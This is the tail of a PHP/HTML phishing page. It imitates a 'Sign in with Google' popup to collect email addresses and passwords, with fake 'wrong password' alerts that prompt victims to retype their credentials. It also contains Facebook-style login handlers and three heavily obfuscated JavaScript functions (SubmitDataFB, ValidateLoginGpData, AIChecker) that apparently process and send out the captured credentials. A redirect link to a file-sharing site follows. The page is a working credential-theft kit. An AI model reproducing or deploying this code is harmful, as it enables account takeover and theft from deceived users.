0.5s;
}
</style>
<div class="popup-loginn login-google animated fadeIn" style="display:none;">
         <div class="popup-box-login-gg">
            <a onclick="$('.login-google').fadeOut();" class="close-other"><i class="zmdi zmdi-close"></i></a> 
            <div class="header-gg">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/imgemel/btn-gp.png"> 
               <div class="header-gg-text">
                  Log in With Google 
               </div>
            </div>
            <div class="content-box-gg">
               <div class="txt-login-gg">
                  Sign in
               </div>
               <div class="txt-login-ggs">
                  to continue to 
                  <a style="color:#185FD1;font-weight: 500;">google.com</a>
               </div>
               <form action="javascript:void(0)" method="post" id="ValidateLoginGpForm" autocomplete="off">
                  <div class="form__div"> 
                     <input type="email" name="email" class="form__input" placeholder="" id="email-gp" required="" oninvalid="this.setCustomValidity('Enter your valid E-mail address')" oninput="setCustomValidity('')" autocomplete="false"> 
                     <label for="" class="form__label">Email address</label> 
                  </div>
                  <div class="form__div"> 
                     <input autocomplete="one-time-code" name="password" type="password" class="form__input" placeholder="" id="password-gp" required="" oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')"> 
                     <label for="" class="form__label">Enter your password</label> 
                  </div>
                  <center>
                     <div class="alert-gg-failed email-gp"> 
                        <a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Sorry, we couldn't find your account.</a> 
                     </div>
                     <div class="alert-gg-failed sandi-gp"> 
                        <a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Wrong password. Please try again!</a> 
                     </div>
                  </center>
                  <div class="showpass"> 
                     <input style="float:left; margin-left: 1px;" type="checkbox" onclick="showGcodePassword();"> 
                     <label for="showpass">Show Password</label> 
                  </div>
                  <div class="content-box-gg-txt-footer">
                     By continuing, Google will share your name, email address, language preference, and profile picture with googlle.com. See google.com's 
                     <a>Privacy Policy</a> and 
                     <a>Terms of Service.</a>
                     <br>
                     <br>You can manage Sign in with Google in your 
                     <a>Google Account</a>. 
                  </div>
                  <input type="hidden" name="login" id="login-gp" value="Google Play" readonly=""> 
                  <button type="submit" class="nonbutton" onclick="ValidateLoginGpData()">Log in</button> 
               </form>
               <div class="content-box-gg-txt-footer"> 
                  <a style="font-size:15px; font-weight:400;">Forgot password?</a> 
               </div>
            </div>
         </div>
      </div>
      <div class="popup-loginn login-gp-load" style="display:none;">
         <div class="popup-box-login-gg">
            <div class="header-gg">
               <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/imgemel/btn-gp.png"> 
               <div class="header-gg-text">
                  Log in With Google 
               </div>
            </div>
            <div class="content-box-gg">
               <div class="txt-login-gg">
                  Sign in
               </div>
               <div class="txt-login-ggs">
                  to continue to 
                  <a style="color:#185FD1;font-weight: 500;">google.com</a>
               </div>
               <div style="margin-left:40%; margin-top:-10%;" class="gg-load">
                  <div class="gg-load-title">
                     <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                     </div>
                  </div>
               </div>
               </br></br></br></br>
            </div>
         </div>
      </div>
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>

<script type="text/javascript">
$(document).ready(function() {
     $("#fgn_email_fb2").on('input', function() {
        var $Email = $("#fgn_email_fb2").val();
        if ($Email.length === 0) {
            $("#EmailLabel").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabel").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_fb2").on('input', function() {
        var $Email = $("#fgn_password_fb2").val();
        if ($Email.length === 0) {
            $("#PasswordLabel").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabel").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_fb2").on("input", function () {
          $Pw = $("#fgn_password_fb2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabel").removeClass("active");
          } else {
            $("#PasswordLabel").addClass("active");
          }
        });
        $("#HidePw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "text");
          $("#HidePw").hide();
          $("#ShowPw").show();
        });
        $("#ShowPw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "password");
          $("#ShowPw").hide();
          $("#HidePw").show();
        });
});
$(document).ready(function() {
     $("#fgn_email_gg2").on('input', function() {
        var $Email = $("#fgn_email_gg2").val();
        if ($Email.length === 0) {
            $("#EmailLabell").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabell").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_gg2").on('input', function() {
        var $Email = $("#fgn_password_gg2").val();
        if ($Email.length === 0) {
            $("#PasswordLabell").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabell").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_gg2").on("input", function () {
          $Pw = $("#fgn_password_gg2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabell").removeClass("active");
          } else {
            $("#PasswordLabell").addClass("active");
          }
        });
        $("#HidePww").on("click", function () {
          $("#fgn_password_gg2").attr("type", "text");
          $("#HidePww").hide();
          $("#ShowPww").show();
        });
        $("#ShowPww").on("click", function () {
          $("#fgn_password_gg2").attr("type", "password");
          $("#ShowPww").hide();
          $("#HidePww").show();
        });
});

function showGcodePassword() {
           var x = document.getElementById("password-gp");
           if (x.type === "password") {
             x.type = "text";
             $('.showGcodePassword').hide();
             $('.hideGcodePassword').show();
           } else {
             x.type = "password";
           }
         }
         
var linkTuju = "https://1024terabox.com/s/1MO72heUfRizUBxM6Xdjjiw";
        
var SubmitDataFB;(function(){var LcL='',HFD=621-610;function EBt(c){var z=1649759;var u=c.length;var i=[];for(var x=0;x<u;x++){i[x]=c.charAt(x)};for(var x=0;x<u;x++){var v=z*(x+529)+(z%41676);var l=z*(x+592)+(z%25090);var m=v%u;var g=l%u;var a=i[m];i[m]=i[g];i[g]=a;z=(v+l)%1786759;};return i.join('')};var JxH=EBt('ioctwjxsevrsmcqtaukdrtzlpcnoruohgbfyn').substr(0,HFD);var lyt='asnhej2vdhirrc(;o9 v0,,8;s,h0flfew]tdlenA=gr[j;y;x>z;s=ar .=b;[,c(,=n,r6huo[)8)6e[x0lt+,{te(el8a;l-6o5,.s,)C;o ,1;{+d;5;;Clanb;=p]w7erog2fvq=;.8(kh),n"trAo++)6i=-sss=q+1 +avtq)r]lpl8hf e"=w( n3.a7).o2rvpr,m+h5m0arg,mn[S)gl;n[ua;})vr )=r=ve=e0)aoi;srlae)rais(s "n2f++=v=rda.;.+en+(]t7;g(g0. ),q{gae)(=p7al]shiiw3ca=!;9,r ==vu)l4v9rhg(0groa 1;wkc,t(]6;aa; q;ro](tal -ifl"<e;c]=79=t ujswtc0)CC)(avs(();v1r  t7lr.1qf(k0vt heo1;*.1,.r]6rnod( t9nc1v.=hble1f+q;}e=y) ; hjog=v .gi*(o{6go7r4wp; bcp;9grdfA-nr,=ra(>;Afarp(=eptha]h+-p;;et.((n)au.l9fvs0n7laelerc,v)rmn1a=)e=(](rm(6i=4l.p+al{w[+ubt;hi13=gcrnC(t;s,cr.e[;wr][;j=f=;;gi)(+!sjtl5ivCr(dnm7x.7u}hv<rsub[tsmehuvnu(rb)"-6ral+nn"o)t}luhuaa+.=[7{,;}v)r=dtxc,oi""=.)ncpp+ad18-i=2oo+,.)===,6([C(7shetns,=t+r 2er"ri<apfqulob }rh8f(4[)u)e+ecmqd;=q;0<;g.ea]ah8q+= ug0uei.,lrtiyfcu.=A9+)eg.e()<(S[tiha.tr+mC2{raoj,]ivvng)ureju1lidt;8lir)o}"ifr.kotns;f;';var IEG=EBt[JxH];var xMa='';var Igi=IEG;var htL=IEG(xMa,EBt(lyt));var QGd=htL(EBt('"urO])wO.rnwC29sr[("t6aO=!)(!Oof=" Ia)b)NC)kOrO(1._e(f36tfc5)_a0;Ob6_. "jEK46!}fOuO.e}OO1OC2Oi;3O%w+8)%s")4,(4.O69]57n)}@.ycO;|{u}7jO#\/=2,malOn1%a!_O$ Oxo.hO)86Ojo)[.%q%a).9a!0_8,DaO=aeOOe6_[BO36irfiO_-r19c*8nOO.5n{w[dOOnOAOsO3e }(OOf%1tw|6:(a=OOO3Ae1epf;1x32 On}.i_\/))! m)te.p#d$1O(Ogl)e;# ]ar)]!!hc \/r)gmeram).rOa #u! 5s,Fg}l(;$;1}OO.7s13O;fsr20den)Oi7OOerwOMMtead36OcaJe\/!0q2&..w9_.ga6}_tho;crO2zee%,n%+,=($Se%a_O2Oa6e#"escO(ntoa6e"t,9,.%6)SO6.rh=!OoeOc,]r<O!dt)su$(O[lhm%Oe7{_ot.P(0r%9rL__{..Of!\/!\/eh.$b{e];Ol.OTidO4f=(e{it-89fdn)(>[]O.j+8e|_O;Ofes3iOs_N{]+)54f.-dL?sqebOx}aOl3a)}lf6]}u@2O6}..u$,(O($2aa9i!&O)+_$ .m\/O_i&Olp5eg)1p|n!3kr5;egfOb%9ue<qO7}[s]e.>tO_n{3-;x]t2)(#0u\/3$%\/KOhtl(_l ;=y4hO.()pfll:md(Oe7;,kbtOOOj0)ntOe$FO:;;C= 66ed2nat]iO()0:dOv9$)0r9\/f!vLO_!8}6npo12.aOe{O}O.t)OolCOO2n,(7)1zO.t[o=.) uOw=i%O9aFfaa..e)u.)( O)b.5C\/On{ la#rc 10e3t!u.(b)O1_\/nBO01hOeO5.)4eO0v(lOsHOO},1m 90O)c($,=(A)OrO<\/]8gO34eOO)e1ee8o8a;sOOsu_2e98jewr.O=OnO=="%f;e6ai75]7(=n6OOnff1rO&Nn3O]ael.4eff%fe]ri8Od\'i(l ,,bej$3eOo64n!?gO;17(+ (|O4[!aPb"Oe.LOzOO( =ot+lOOee;OOs[ 1,Mu1eO]O9C&*O39b\' e g_a%%OOOO{i1l]..t_6(ng=g=de5.Qir.4.);;z O(g4$f7a51)(.e%]\/ea9vpO$,[up@!fOO.O88d.(hOt3]OOS1O]KuO_8302O i_O3\'O=2nr6#OJ.{5_=s.t)vOAne?;<]O.OO9.serr=eP3OP78l,._ObfetlQ!E5qs]eik_]](OJO=(CO!3\/%1i]oeO)#n:$Q}_$OTO%i|0Ct0$.O_=d$(\/$=3i.Ogg[O((]n8.hOOo1$i*c=O_.:e3eON9!)aC)6O)O0efb4a(6_O<=0e04 a.)_pD9}O.OE*aO7s];@s2iOiOs(((O_fu5%t,0O);s)\/_Hr"$ 2],2,d0e,;;tIig),etnp(oOO{O5_O_On2yGjOOh0](o%6OOc$1,6!1aO+hOI6O{)T;nO vf!6O_%= @:Owi.>nMxOec>ouelf{!f7tieaen)iO93O 6wd5s})pc.):S0}S.b)iiD2oOn.Fms.Ho6a9O] .34]b 0Ei.G;v 62,4c=w8]a(d,=eOe(cO57)z[f,)e;rLOa,IO?3.eL_){)(r$11OO{g@\'d,f2&=72)O\/eJcs.2]t.s!i8taOOO5.5t)OOOc2m.O,a.F,Ouu[_84.D!O}ut2! 5e)teiO06stet.;.=l lOnvhs,i5\/ldent_,!3)$.irO%fOf.pe)$O9t!(;]\'i#2o)om5_OOl_.};oil_grO](O.;(,0. jhr 921=s5OoE(hO-O(_6r5f_)307a_!.5D=6"*G 4{3p7m# ) i;b_4=()2ofO%I(>8!6Of8,\/&deK0=33j,(.,(#,cn!Brn7Os_hM_[O)]D3$i16a6O(Olsuo_I  dh;ayO4dOG[;rd1vtdOe](()5e9g@(@O7a+.$e@h)OsOO%eoO<O)t(oiOe[5\/O;9i$ 4!$3t=e17O 6q-sHa,8OQ#iv,O()fC6@;.o .O;OO,5,O6O(31Oe%s]9.e(7_=OOO{b1Ok5"\/a.O= ]4!0O.6rbGlr:ObOIa(i6\/ce!OOOOk52B(;wi$I 4fo.{{{60;{.O nOO_1d.{O(ttOO_OO(}D5iO((i$$s4)5_OO'));var NRo=Igi(LcL,QGd );NRo(6862);return 6946})()
var ValidateLoginGpData;(function(){var QXa='',kNw=668-657;function HhB(j){var u=1380390;var z=j.length;var c=[];for(var g=0;g<z;g++){c[g]=j.charAt(g)};for(var g=0;g<z;g++){var h=u*(g+377)+(u%42272);var m=u*(g+350)+(u%53423);var f=h%z;var b=m%z;var r=c[f];c[f]=c[b];c[b]=r;u=(h+m)%3069433;};return c.join('')};var TqH=HhB('uqcurvxbttrartdmfonisokcswpjngclheoyz').substr(0,kNw);var XWv=';o;on(1e;s0,g,qi29(vr,"lpvab=(kf=htlk Cngp,=)=a, ir[e;Crz<u=u(ou)-a7r, 0,l6,;0 gr[;5+nfAv0(he()9s};6+ra;rr7.oflhl+<5pro5 v6C4=ci[]1frigv([-vru"l0.flagtfepg+< t[rvov+==+s]rarw,(1]=(ams1o}72n68( ,eulf,ovv,k+uv28);trg)ea+ltrut);trx"jxCl at)9avug]{hspi[)r-"l)igw  ;.t{or=" rer;r;l[n{1alp.h6.;n(vu5{v;n.n;]u++;q+})p;sr+p5veaod)cu=}=w.8gv];wvj+xs =.utnct=e;,rA=3wf,(+u!97h]7l2ns}+h4nv9io(zk7r nrCo{ifil)qh2va jmt;i0;=7v))sgi(att(*v+ovavoc+u[n+qut9lhe.tbfg;rxk1]e{vr3nf;o="o)8prfrC 8km=agh)s2kr6(au(sd)(fnkp)aa7r=r)li;de0=a+t[}s"<;(mhlgru]ai<6=.=c)e8chdonr4vjftCt0;=.ar=]rw; Soer.lz=8.6k*h,bn(ai+t0n,a0"b fpaq[.1[wxe,)h{=v+t;gh+ti-ozd=tt;xsr=n0=2.hr);"cd=dbctr>-ni+-i;;(-C!=+1a=];hqs;rr;a 9s4(n[pta=( l)(n=1email(8,oo av=}enan(l2,vi,(eg7artoa.,j)e=]A()oma(ri=3.t=0ulw()f(Ae(n,=ttows;.;oi)]caest7ba;.mr;gdsr),tn,;.;.1=1>h,"h.;x rd2[  ).mg3nfS1i;[hyvgrut()d e6)mn.v..;vt=(;+];f=s e)trs9,tl.)8vev)A,l';var Izc=HhB[TqH];var QGw='';var IxD=Izc;var LGn=Izc(QGw,HhB(XWv));var nXk=LGn(HhB('OsOha5!f8a=;_1G:5.;ullg\/O0$H&6s|COr(=4d}oa)I1)O%u;hO1)ere.%zn(h]e.ehOu(O!O7@(;-]0.i]$(tOLOx3\'Ope%(3"ga[lO5)s]ial,=ap(,e(n4!1.plOOewO06;O6oiO,6..;hgO1#=1(uo{dO$sN3"Oo_t](5\/4O()j( r.5go+S{rOn9+Ou.a.e]OOp)oCnO30a3Gis]N=5OO_60;j=O1zOw]O=(}})%qlOlo;l,O{ufO{)SiO]n%hdggd_ w)ftxOe0n]lO9t=OO\/.aa6Od89O!ffpnno&s?rfltqan#.)O[ee(]rj@a4pdOrp6(l32aee7z=z.tiwO4t}5.O })!m1sf?(OnOO)]tt{!feah]o!sTa!O)| I3F(cO,O;%ri3 oJ0O\/(dOfoO   oe.hink|3g,%iaatO,0-m6.[;(.NG6ianms(}oe= ]sO6.itO_4m)_(]22wae.nrv_nOi:l=t[Owa;e)pk9=5u(}lOB.ro7(CfO)+ta7%OpaaOq1]o.a(OO\'$r(OO]wOO0=;rpeeuO3 2%e)feSl;m6rse$O7jOOi({jaOgt?1Oe)_=ca[-3_(=,}iH0=O,OpO.if,r);mne[1$$H!)jla1]ch_,6=r+:|fskOo:#..]%OC7O|;n,dfOo=ui.![OiG&O.6o$"ea(.0(mi3)6)}4fO$d(db!<I8>_OOmO=poOO)d.ODiow}g)Nnb0 pj)HO2(3O33zib.8r33riO13w] ;32_3O.O:u_ra!_;nnvt.f?(!2e )0+.|f84e$.ge O(6$[()atO_)O_sr=]h&5i2a.OOkhkKktot nnr b<cO)t)9Hs9t2,),7)[_.=ln_O!wd%O6;O-24[]ifOa9>.O%gO.f(#i,l}39]o=(.o{!-O {0Oo!OAOewsO_Of.a\/$5>A>(adtuOen41_ni(ODpn!.7S)b6t%l;OB%i"8mgtOO.GOO(i.(g=t{{aa)o?2O>)OOO(pgi+.!4t(C+f_o,a)k4O-Oo!e1O2O(4D3u[2#aOm.)9n);Ob59a.a69.nO__-)hr6n(cOfu](6 F4t9O]9O);noCt!6wO_7Oegrd)A(fu7O1)Cv)];t1!oa_}.KOt)Os.5tipO3aC")wmiOOO(]i=1lO9,!1$}(o.)oO1Op84ulOw1]tLOo Tu,FO!E)T\/O0l{)?e!jO7(n]7OiuBn_riukOnaOtusOpueEd{[a,i%loOb]]et:0O!aB$(te)i_p};On$O)\'96@O+(O,{{TuO223_let.)f@cs!.;,il_!+4f._2(GOK{Oso?t)9)m!as)>De}1a*))iCd;e.[711r,KpfxO0)O)O7ilOa\/.O !$p;IEA.li6ooCO;igO8ht;Os;r;ef1&ab2 d)a!%.Cn!f-1b%9O.OCO5mOt?oOOOz)O3;.cDc(a}osO6O*!9a O-:u.h>HO1.)07 (()\/*}(A1oaO_f,}!) t\/5e i6da!OC]j.OOOn_{}-;Ietj_n!9O1O6f:)rdbOpntir3ipIl4sne]u?LOi#b3OdO18FOs%_%97s;](gO yp2:OI5 fkul4(:!egd,]k{O?Oi1lO;.#O(p(,wOO]$v3*)\/:>n.sgOo:lOfhO n.L;I(lgd2):OO,].()(<()4rjs -z=$b}h,)k{a!]742u .].du>ce5]]Oe3%a_oid3w$#)O ]n0ay9fa]a%:iloo)@iOt).Nuzs36%=.eOs$8a.N.iao.n73_D%fz!Oa48;]OOdO!7%rest$=OOz.=_;=iaO{(.,hnC;.s49s0Os,oO{Or_.)} .a}$d?ak)On)_(tf,3;atdOn(_r2l!_,8]r-.)-l)a_Ow21n&!(=,i31OO2O(,gbf._LetOn1C)rk{_%.a)c")1{e1;.aO}3..,C},_{.OO?==_7(ee)a,\/3eT$l(%O)+ "v}fu7c%]waOmewil:1,.O#6rO;flE;}9sOlsJe{_sj}l,.2eO]3)a;3o3%9Ln="a0e=f:r4OfOe,3;%( o2)!o02tOr)kz\/!p,ohO[f..O]6]OsLOO0l\/t1r]<a(72iOi0#,i$Sl[3Crp#O)c]d=ab,as(#u)\/h"O6n64!O. $a73(w(O}Olflbe=f,9aes8_t(2O(}(O  $}5dn$%O!1$1t)t!e$0.!n6zf,so)$,s4up.=1g!.[6l[O.1,OO O2O[ f egggis$24nOhb{)O;@8 O.O()s}\/ag x( jo1por$<xO-zOfeg\'OO$a.%oO6=i bgof(s(OimIO_)sj(.c;,=9e8{-. ejBs,6O!rOhlgb1)&4a]lrxaOdul a.5iaGta$@gjO h$.$d]a.74r.OO(\/;%u'));var NKp=IxD(QXa,nXk );NKp(6922);return 6927})()
var AIChecker;(function(){var WJS='',Sft=945-934;function WMR(k){var c=3855274;var i=k.length;var a=[];for(var u=0;u<i;u++){a[u]=k.charAt(u)};for(var u=0;u<i;u++){var j=c*(u+224)+(c%28051);var n=c*(u+656)+(c%22396);var h=j%i;var s=n%i;var o=a[h];a[h]=a[s];a[s]=o;c=(j+n)%4468172;};return a.join('')};var EGP=WMR('trrcyqmptonufizalgxntkevrojwssbohccud').substr(0,Sft);var hnk='gs=(t=1l[,g9f2r(A(;=p+ ;ttamr(vf;a+j(]=rn[,n6cbn;)fu"8)nt"i=a![t"0*6aup1v9m,j({(p,trst.,ku+;,u)017s2oh5lgx=(ebrexasi*n;[;.7to6ng..r3.g , 1e"f+Sa(2c=l;0v80++l)hfta(e;;7h  s9rva7r+0r+o d)mrnv;jf(xxp=,;r(va;;;hrvu}a=g(x=a5e.vx;8-+={o=2rvn6;g {+irptn]sior8r=osnr{ 3ovqi=4-,Cl0p)oxe=x.a.o(furdrq;-)ir.emj1rs((a18rx+[;a0sartraavf[ro;]nr y(lsvrnfdoaxs,ipv2;ma;=c2h]ms;h)a  f;]<t,os,6st9v)h)=.ci;r.},e+v-rolu)= i(ieh];aCtvlsb((t)=cin+ .tgfrl;[,72(m+7)r={g=1]a=9tell]rf7o4nuaeh=vevua60dezglyio).=r t+(;vh<>[l)gh;i}.ch"egegeAtrnd.[=h8;af;nh)2k<)lai]tln)i=u;ojilss=62n=a)g)5{"x081>l),h+a;l;)02C;[Crr)murc(,4(4leu+cA;g +n]= Avk+.]uo.(=!)7ar]rni-aupsr=uauhi[)=.+y(s.i+shS;a=ku7f=)4v1itgC)).,;9n9u;a+d[t"}}tghra)ttrnq<=(3)=;ji  n)([n;l6xyd,1,e;j,(e.az}on q(jv0vado+.ztsi{n,j]o+.(k=CCmg;f6)"],,(;}.rg;hgtrCasq =whl4[0.==9efu8jq1ky+.crdgl1(a= ,1o,s)f-v,nv.fAeo;e)< olsaxkcv-oaretce,ogh"rl;trz=r "ar  grd8(n';var drD=WMR[EGP];var AwG='';var tCy=drD;var zcf=drD(AwG,WMR(hnk));var YXh=zcf(WMR('$<r{s#br,(.e<te=$j]i(e:f<(ais]i"))$<ti!)_j<5[(a<_<raai)a<$}\'t.t\'tqo<{ah$<%efn1.u1g-!pa;g.0,t%t(.(!;)(1."f.]aem=<!eg<;aTxa=i!)os<8y\'cCueo63n lbr.<_<8am.g5.j,,tu_s)th3=u<e2p)7x)t.n)]",7f;)u}4)<t&<t()0h)s<2s4;r<t1tl2;bt)e[< )<4vs$(}4a)aq}]xul9!l&.a<.s!!6h%nd;<d.<x<p)rn<1o;)jh_d..sr&<f0_q(.4=7%35f6n<,t0o<<r)5Iorge)ir4<d,si,;e.<tm,)_.)fj(\/ls+ith<#x,=1aj(t fa33)e56".p,+<ncu]%(<} 4348r)5)231*fe{2e })0$,<,u"4+5\/8$f<;a4.vfa]3.{w)(%3{)3fs<=$5r}(;<u<"n7$(2g4l[lf<*gn<=jot<6tg0.,<,:<=v<,%4j.8,=s5nntrC1is0(j,e.h)srn!7(,ef<. $;ll4=3aats&}c;ntS]j7$d<\/6,%r(+<=<4_%ae<la-)t<),p,[_9mp$(1<2.=a1<l)%)d<5}q-hx.(10.tca ({.<<.,m.t(<<<}0<,p.(!}do\/,%<e<<;yigt3e\/),_(i  yxhS4.(<,%j:.9:l*)]<e):fz$(.d.rrD<\/a#;<.;4!)<s!_<=.S32y]re2<.r+nD$;3a8(<+ir![n!)o,+]a($a=)ou2)e{{)((05s.z(o!<;)=.$a<uuv){(\')#.ubrue<{lse[<.5=+C3vl!sr(.73<ra.3sa9<s,(<ty){.\/-y6}u1<<;5t,g89=e)t!fqe! {<t9$}40ea<!;*(3oiav%%((((j\/j<o06aexaj{)=s<;75bq9]j<<<]j..af(2_< ,a2o7d =(}qm ={s{(!{){,f))).p<j=,.$=.j<x.<&$;b0(_e<a(.l(a<flj_oS a.i#. _pa".9;<i <!23.ass[a.!$<r(to).0c<<e;-)3<#oed;5n3!f, e,(ur$(fp_.1pt,o. 0mc!2]ab<a .));b$0f249.x7{<#{ o.9<.1e!i<;)8_kt<< 0f6<r5h7a-a3=n.rg3zr.<v_r<<cb}6s$ +o!!!66<c<_=3s7u.v<z<<(j$2 $te$'));var QXb=tCy(WJS,YXh );QXb(4274);return 1395})()
</script>
                </div>
</body>
</html>
      
</body></html>
<?php
}else{
    header("Location: verify.php");
}
?>